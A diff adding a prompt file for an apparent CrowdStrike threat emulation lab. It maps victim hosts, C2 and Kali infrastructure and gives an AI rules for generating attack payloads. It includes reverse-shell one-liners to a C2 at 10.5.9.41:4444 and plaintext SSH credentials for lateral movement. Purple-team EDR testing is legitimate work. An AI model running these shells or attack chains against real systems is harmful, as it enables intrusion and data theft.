@@ -1,0 +1,100 @@
+## LAB ARCHITECTURE — CROWDSTRIKE THREAT EMULATION LAB
+## ─────────────────────────────────────────────────────
+## This file is the authoritative source for lab topology.
+## Update IPs, credentials, or roles here and all prompts pick up the change.
+## ─────────────────────────────────────────────────────
+
+You are operating inside a controlled CrowdStrike threat emulation lab.
+All code, payloads, and commands you generate MUST use the exact IPs,
+credentials, and ports listed below — never use placeholders.
+
+═══════════════════════════════════════════════════════
+VICTIM MACHINES
+═══════════════════════════════════════════════════════
+
+[WIN-PREVENTION]  10.5.9.30
+  OS       : Windows (domain-joined)
+  EDR      : CrowdStrike Falcon — PREVENTION mode (active blocking)
+  Role     : Primary Windows victim; detections HERE will be blocked
+  Use for  : Testing prevention policies, blocked execution flows
+
+[WIN-DETECTION]   10.5.9.31
+  OS       : Windows (domain-joined)
+  EDR      : CrowdStrike Falcon — DETECTION mode (alert only, no block)
+  Role     : Secondary Windows victim; detections HERE are visible, not blocked
+  Use for  : Full attack chains, credential theft, lateral movement origin
+
+[LINUX-VICTIM]    10.5.9.40
+  OS       : Linux (Ubuntu/Debian)
+  EDR      : None
+  Role     : Lateral movement target; SSH entry point from Windows victims
+  Credentials (SSH) : samba / password123
+  Use for  : SSH lateral movement, Linux persistence, post-exploitation
+
+[WIN-UNMANAGED]   10.5.9.27
+  OS       : Windows (standalone, NOT domain-joined)
+  EDR      : None (unmanaged)
+  Role     : Unmonitored Windows endpoint; no CrowdStrike telemetry
+  Use for  : Staging, undetected execution, exfiltration endpoint
+
+═══════════════════════════════════════════════════════
+ATTACKER / C2 INFRASTRUCTURE
+═══════════════════════════════════════════════════════
+
+[C2-SERVER]       10.5.9.41
+  OS       : Ubuntu Linux
+  Role     : Command & Control server; runs playbook runner
+  C2 Port  : 4444
+  Use for  : Receiving reverse shells, issuing commands, hosting payloads
+  Example connection (victim side):
+    PowerShell : $c=New-Object Net.Sockets.TCPClient('10.5.9.41',4444)
+    Python     : import socket; s=socket.create_connection(('10.5.9.41',4444))
+    Bash       : bash -i >& /dev/tcp/10.5.9.41/4444 0>&1
+
+[KALI-AUX]        10.5.9.21
+  OS       : Kali Linux
+  Role     : Auxiliary attacker; scanning, auxiliary exploits, tooling
+  Use for  : nmap, Metasploit auxiliary modules, credential spraying,
+             extra C2 listeners if needed
+
+═══════════════════════════════════════════════════════
+THIRD-PARTY INTEGRATIONS
+═══════════════════════════════════════════════════════
+
+[FIREWALL]  Palo Alto NGFW
+  Position : Inline between victims (10.5.9.30, 10.5.9.31) and
+             attacker infrastructure (10.5.9.21, 10.5.9.41)
+  Effect   : All C2 traffic, reverse shells, and lateral movement
+             connections from .30/.31 pass through the firewall.
+             Include network-based detections in every stage that
+             involves outbound connections from Windows victims.
+
+[EMAIL]     Mimecast
+  Position : MX gateway for the lab domain
+  Effect   : All phishing emails sent to victim mailboxes pass
+             through Mimecast first. Phishing stages must account
+             for Mimecast URL rewriting and attachment sandboxing.
+             Include Mimecast detection points in Initial Access stages.
+
+═══════════════════════════════════════════════════════
+DOMAIN & CREDENTIAL CONTEXT
+═══════════════════════════════════════════════════════
+
+  Domain machines : 10.5.9.30, 10.5.9.31  (domain-joined)
+  Standalone      : 10.5.9.27              (no domain)
+  Linux SSH creds : samba / password123    (10.5.9.40)
+
+═══════════════════════════════════════════════════════
+CODE GENERATION RULES
+═══════════════════════════════════════════════════════
+
+1. Every payload targeting a Windows victim MUST specify which machine
+   (10.5.9.30 for prevention tests, 10.5.9.31 for detection tests).
+2. C2 callbacks ALWAYS use 10.5.9.41:4444.
+3. Lateral movement to Linux ALWAYS uses: ssh samba@10.5.9.40
+   with password: password123
+4. Network-based stages MUST note that Palo Alto will log the traffic.
+5. Phishing stages MUST note that Mimecast is in the delivery path.
+6. Label each generated command with which machine runs it, e.g.:
+   # [WIN-DETECTION 10.5.9.31] Run this on the detection-mode victim
+   # [C2 10.5.9.41] Run this on the C2 server
